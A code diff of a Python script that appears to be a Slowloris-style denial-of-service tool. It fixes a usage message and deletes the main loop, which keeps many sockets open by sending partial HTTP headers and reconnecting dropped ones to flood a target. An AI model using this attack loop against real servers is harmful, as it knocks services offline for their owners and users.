@@ -49,8 +49,8 @@ def init_socket(ip,port):
 
 def main():
     if len(sys.argv)<5:
-        print(("Usage: {} example.com 80 100 5".format(sys.argv[0])))
-    return
+        print(("Usage: {} example.com 80 100 10".format(sys.argv[0])))
+        return
 
     ip = sys.argv[1]
     port = sys.argv[2]
@@ -69,25 +69,4 @@ def main():
 
     bar.finish()
 
-    while True:
-        print(("\033[94m [÷] Kahr build attack flooding the target {}".format(len(socket_list))))
-
-        for s in socket_list:
-            try:
-                s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
-            except socket.error:
-                socket_list.remove(s)
-
-        for _ in range(socket_count - len(socket_list)):
-            print(("\033[33m {}      Connenting...".format("\n")))
-            try:
-                s=init_socket(ip,port)
-                if s:
-                    socket_list.append(s)
-            except socket.error:
-                break
-
-        time.sleep(timer)
-
-if __name__=="__main__":
-    main()
+    
